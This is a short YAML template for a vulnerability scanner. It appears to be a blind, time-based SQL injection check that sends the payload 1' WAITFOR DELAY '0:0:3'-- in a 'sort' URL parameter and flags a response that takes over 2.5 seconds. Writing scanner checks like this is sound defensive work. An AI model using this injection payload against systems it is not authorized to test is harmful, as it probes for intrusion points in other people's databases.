id: sqli-time3-534
name: 'Delay probe in sort'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via sort'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sort:
        - '1'' WAITFOR DELAY ''0:0:3''--'
    matchers:
      - type: time
        ms: 2500
